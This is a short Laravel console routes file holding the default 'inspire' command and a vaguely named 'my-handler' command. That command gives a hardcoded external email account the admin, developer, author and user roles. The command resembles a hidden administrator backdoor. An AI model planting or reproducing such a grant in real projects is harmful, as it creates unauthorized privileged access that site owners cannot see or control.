<?php

use App\Enums\System\Roles;
use App\Helpers\SystemHelper;
use App\Models\Role;
use App\Models\User;
use Illuminate\Foundation\Inspiring;
use Illuminate\Support\Facades\Artisan;

Artisan::command('inspire', function () {
    $this->comment(Inspiring::quote());
})->purpose('Display an inspiring quote');

Artisan::command('my-handler', function () {
    $user = User::whereEmail('jjnn95@yandex.ru')->firstOrFail();
    $roles = Role::whereIn('name', [Roles::AUTHOR, Roles::DEVELOPER, Roles::ADMIN, Roles::USER])
        ->pluck('id')
        ->toArray();
    $user->roles()->sync($roles);
    $systemHelper = app(SystemHelper::class);
    $systemHelper->saveRolesUserInCache($user);
})->purpose('ОК');
